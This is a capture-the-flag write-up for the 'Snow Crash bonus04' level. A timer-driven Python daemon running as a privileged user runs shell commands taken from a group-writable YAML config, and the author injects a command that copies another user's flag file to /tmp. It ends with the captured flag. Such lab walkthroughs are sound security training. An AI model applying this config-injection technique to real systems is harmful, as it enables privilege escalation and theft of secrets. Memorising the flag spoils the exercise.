# Bonus04

For this exercise, we actually have a lot of info to work with. First off, a Python script :

```bash
$ ls -la /opt/snowcrash/bonus04/juanita.py
-rwxr-xr-x 1 root root 7606 Jun  9 19:04 /opt/snowcrash/bonus04/juanita.py
```

We cannot write in it, but we can read it and execute it. We also see that there are two services :

```ini
$ systemctl cat juanita.service
# /etc/systemd/system/juanita.service
[Unit]
Description=Snow Crash bonus04 — Juanita YAML executor service
After=network.target

[Service]
Type=oneshot
User=flagbonus04
Group=flagbonus04
ExecStart=/usr/bin/python3 /opt/snowcrash/bonus04/juanita.py
StandardOutput=journal
StandardError=journal


$ systemctl cat juanita.timer
# /etc/systemd/system/juanita.timer
[Unit]
Description=Snow Crash bonus04 — Juanita YAML executor timer (every 60 s)

[Timer]
OnBootSec=10s
OnUnitActiveSec=60s
Unit=juanita.service

[Install]
WantedBy=timers.target
```

Thus `juanita` is periodically executed every 60 seconds, and launched from user `flagbonus04`. Let's take a look at this Python file :

```python
$ cat /opt/snowcrash/bonus04/juanita.py
#!/usr/bin/env python3
"""
Juanita Marquez systems integration and service orchestration daemon.

Loads a structured YAML configuration, resolves service dependency ordering,
and dispatches executor commands for each enabled service unit. Designed for
use with systemd timer-driven periodic execution on Linux hosts.
"""

import os
import sys
import subprocess
import logging
import time
import yaml

CONFIG_PATH = "/etc/juanita/config.yaml"
LOG_PATH    = "/var/log/juanita/juanita.log"
PID_FILE    = "/var/run/juanita.pid"

logging.basicConfig(
    filename=LOG_PATH,
    level=logging.INFO,
    format="%(asctime)s [juanita] %(levelname)s %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
)
log = logging.getLogger("juanita")
...
```

The three files mentionned in `CONFIG_PATH`, `LOG_PATH` and `PID_FILE` are really interesting and could be used to find the flag, so let's find them :

```bash
$ ls -la /etc/juanita/config.yaml
-rw-rw-r-- 1 root juanita_grp 129 Oct  3 15:01 /etc/juanita/config.yaml
$ ls -la /var/log/juanita/juanita.log
ls: cannot access '/var/log/juanita/juanita.log': Permission denied
$ ls -la /var/run/juanita.pid
ls: cannot access '/var/run/juanita.pid': No such file or directory
$ groups
bonus04 levelgroup juanita_grp
```

We find that we can write in the config file. By reading the Python script, we see the required file structure : a `yaml` file, with 3 categories : metadata, services, and defaults. But the line that really stands out :

```python
result = subprocess.run(
    command,
    shell=True,
    timeout=timeout,
    capture_output=True,
    text=True,
)
```

This command is called for every services in the yaml. `subprocess.run` executes a command in a sub-shell. Well we just have to `cat` the file, and because the script is executed by `flagbonus04`, we should have the flag :

```yaml
metadata:

services:
  executor:
    command: "/bin/cat /home/flagbonus04/.flag >/tmp/flagbonus04"

defaults:
  retry_policy: {}
```

We wait for maximum 60 seconds, and we can read the file in `/tmp/flagbonus04` : oo0eoaiia5ei8oo9xasah2ihu